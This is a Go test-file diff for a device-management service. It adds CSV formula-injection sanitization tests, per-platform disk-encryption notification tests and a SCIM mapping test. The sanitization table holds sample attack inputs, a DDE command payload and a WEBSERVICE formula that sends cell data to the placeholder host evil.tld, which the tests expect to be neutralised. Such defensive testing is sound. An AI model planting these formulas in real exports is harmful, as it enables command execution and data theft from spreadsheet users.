@@ -1896,6 +1896,62 @@ func TestListHosts(t *testing.T) {
 	require.True(t, ds.LoadHostSoftwareFuncInvoked)
 }
 
+func TestSanitizeCSVFormula(t *testing.T) {
+	t.Parallel()
+
+	cases := []struct {
+		name string
+		in   string
+		want string
+	}{
+		{"empty", "", ""},
+		{"equals", "=1+1", "'=1+1"},
+		{"plus", "+SUM(1,1)", "'+SUM(1,1)"},
+		{"minus", "-2+3", "'-2+3"},
+		{"at", "@SUM(1,1)", "'@SUM(1,1)"},
+		{"dde command", `=cmd|'/c calc'!A1`, `'=cmd|'/c calc'!A1`},
+		{"webservice exfiltration", `=WEBSERVICE("http://evil.tld/?x="&A1)`, `'=WEBSERVICE("http://evil.tld/?x="&A1)`},
+		{"tab", "\t=1+1", "'\t=1+1"},
+		{"carriage return", "\r=1+1", "'\r=1+1"},
+		{"hyphen leading text", "-laptop", "'-laptop"},
+		{"leading space", " =1+1", "' =1+1"},
+		{"leading spaces", "   @SUM(1,1)", "'   @SUM(1,1)"},
+		{"newline then formula", "\n=1+1", "'\n=1+1"},
+
+		// Values that must be left untouched.
+		{"whitespace only", "   ", "   "},
+		{"tab then text", "\tfoo", "\tfoo"},
+		{"leading space then number", " -1", " -1"},
+		{"trailing space after number", "-5 ", "-5 "},
+		{"integer", "42", "42"},
+		{"negative integer", "-1", "-1"},
+		{"negative float", "-1.5", "-1.5"},
+		{"positive sign", "+1", "+1"},
+		{"negative exponent", "-1.5e10", "-1.5e10"},
+		{"email", "user@example.com", "user@example.com"},
+		{"timestamp", "2022-03-15T17:23:56Z", "2022-03-15T17:23:56Z"},
+		{"hostname", "foo.local0", "foo.local0"},
+		{"zero", "0", "0"},
+		{"internal equals", "a=1+1", "a=1+1"},
+		{"newline leading", "\nfoo", "\nfoo"},
+	}
+
+	for _, c := range cases {
+		t.Run(c.name, func(t *testing.T) {
+			t.Parallel()
+			require.Equal(t, c.want, sanitizeCSVFormula(c.in))
+		})
+	}
+
+	t.Run("already sanitized values are left alone", func(t *testing.T) {
+		t.Parallel()
+		// The single quote is not a formula trigger, so re-applying the
+		// transformation must not stack prefixes.
+		once := sanitizeCSVFormula("=1+1")
+		require.Equal(t, once, sanitizeCSVFormula(once))
+	})
+}
+
 func TestStreamHosts(t *testing.T) {
 	t.Run("Happy path", func(t *testing.T) {
 		// Create a mock iterator for the hosts.
@@ -4946,13 +5002,25 @@ func TestSetDiskEncryptionNotifications(t *testing.T) {
 				ctx = capabilities.NewContext(ctx, &r)
 			}
 
+			// "configured" means configured for every platform; per-platform
+			// gating has its own cases below the table-driven run
+			var diskEncryption fleet.DiskEncryptionConfig
+			if tt.diskEncryptionConfigured {
+				diskEncryption = fleet.DiskEncryptionConfig{
+					MacOSEnabled:       true,
+					MacOSEscrowEnabled: true,
+					WindowsEnabled:     true,
+					LinuxEscrowEnabled: true,
+				}
+			}
+
 			notifs := &fleet.OrbitConfigNotifications{}
 			err := svc.setDiskEncryptionNotifications(
 				ctx,
 				notifs,
 				tt.host,
 				tt.appConfig,
-				tt.diskEncryptionConfigured,
+				diskEncryption,
 				tt.isConnectedToFleetMDM,
 				tt.mdmInfo,
 			)
@@ -4965,6 +5033,47 @@ func TestSetDiskEncryptionNotifications(t *testing.T) {
 			require.Equal(t, tt.expectedNotifications.RotateDiskEncryptionKey, notifs.RotateDiskEncryptionKey)
 		})
 	}
+
+	t.Run("notifications follow the host platform's setting, not the aggregate", func(t *testing.T) {
+		appConfig := &fleet.AppConfig{MDM: fleet.MDM{EnabledAndConfigured: true, WindowsEnabledAndConfigured: true}}
+		ds.AppConfigFunc = func(ctx context.Context) (*fleet.AppConfig, error) {
+			return appConfig, nil
+		}
+		ds.GetHostDiskEncryptionKeyFunc = func(ctx context.Context, id uint) (*fleet.HostDiskEncryptionKey, error) {
+			return nil, newNotFoundError()
+		}
+		r := http.Request{
+			Header: http.Header{fleet.CapabilitiesHeader: []string{string(fleet.CapabilityEscrowBuddy)}},
+		}
+		ctx := capabilities.NewContext(ctx, &r)
+
+		windowsHost := &fleet.Host{ID: 1, Platform: "windows", DiskEncryptionEnabled: new(false), OsqueryHostID: new("foo")}
+		macHost := &fleet.Host{ID: 2, Platform: "darwin", OsqueryHostID: new("foo")}
+		mdmInfo := &fleet.HostMDM{IsServer: false}
+
+		// only Windows configured: the Windows host is notified even though the
+		// aggregate (AND of the four settings) is off
+		notifs := &fleet.OrbitConfigNotifications{}
+		err := svc.setDiskEncryptionNotifications(ctx, notifs, windowsHost, appConfig,
+			fleet.DiskEncryptionConfig{WindowsEnabled: true}, true, mdmInfo)
+		require.NoError(t, err)
+		require.True(t, notifs.EnforceBitLockerEncryption)
+
+		// only macOS configured: the Windows host is not notified
+		notifs = &fleet.OrbitConfigNotifications{}
+		err = svc.setDiskEncryptionNotifications(ctx, notifs, windowsHost, appConfig,
+			fleet.DiskEncryptionConfig{MacOSEnabled: true, MacOSEscrowEnabled: true}, true, mdmInfo)
+		require.NoError(t, err)
+		require.False(t, notifs.EnforceBitLockerEncryption)
+
+		// only Windows configured: the macOS host's key-fetch path is skipped
+		// entirely, so no rotation is requested
+		notifs = &fleet.OrbitConfigNotifications{}
+		err = svc.setDiskEncryptionNotifications(ctx, notifs, macHost, appConfig,
+			fleet.DiskEncryptionConfig{WindowsEnabled: true}, true, mdmInfo)
+		require.NoError(t, err)
+		require.False(t, notifs.RotateDiskEncryptionKey)
+	})
 }
 
 func TestGetHostDetailsExcludeSoftwareFlag(t *testing.T) {
@@ -5182,7 +5291,7 @@ func TestSetHostDeviceMapping(t *testing.T) {
 		assert.Equal(t, fleet.DeviceMappingMDMIdpAccounts, result[0].Source)
 	})
 
-	t.Run("IDP source same email returns early without updates", func(t *testing.T) {
+	t.Run("IDP source same email skips email update but still reconciles SCIM mapping", func(t *testing.T) {
 		ds := new(mock.Store)
 		svc, ctx := newTestService(t, ds, nil, nil, &TestServerOpts{License: &fleet.LicenseInfo{Tier: fleet.TierPremium}})
 
@@ -5195,6 +5304,14 @@ func TestSetHostDeviceMapping(t *testing.T) {
 		ds.ListHostDeviceMappingFunc = func(ctx context.Context, hostID uint) ([]*fleet.HostDeviceMapping, error) {
 			return []*fleet.HostDeviceMapping{{HostID: hostID, Email: "user@example.com", Source: fleet.DeviceMappingIDP}}, nil
 		}
+		ds.ScimUserByUserNameOrEmailFunc = func(ctx context.Context, userName, email string) (*fleet.ScimUser, error) {
+			return &fleet.ScimUser{ID: 2, UserName: "user@example.com"}, nil
+		}
+		ds.SetOrUpdateHostSCIMUserMappingFunc = func(ctx context.Context, hostID uint, scimUserID uint) ([]fleet.ActivityTypeResentCertificate, error) {
+			require.Equal(t, uint(1), hostID)
+			require.Equal(t, uint(2), scimUserID)
+			return nil, nil
+		}
 
 		userCtx := test.UserContext(ctx, test.UserAdmin)
 		result, err := svc.SetHostDeviceMapping(userCtx, 1, "user@example.com", fleet.DeviceMappingIDP)
@@ -5203,9 +5320,11 @@ func TestSetHostDeviceMapping(t *testing.T) {
 		require.Len(t, result, 1)
 		assert.Equal(t, "user@example.com", result[0].Email)
 
-		// These should NOT be invoked because the email hasn't changed
+		// Email update should NOT be invoked because the email hasn't changed
 		require.False(t, ds.SetOrUpdateIDPHostDeviceMappingFuncInvoked)
-		require.False(t, ds.SetOrUpdateHostSCIMUserMappingFuncInvoked)
+		// But SCIM mapping SHOULD still be reconciled (fixes #46624)
+		require.True(t, ds.ScimUserByUserNameOrEmailFuncInvoked)
+		require.True(t, ds.SetOrUpdateHostSCIMUserMappingFuncInvoked)
 	})
 
 	t.Run("IDP source different email proceeds with update", func(t *testing.T) {
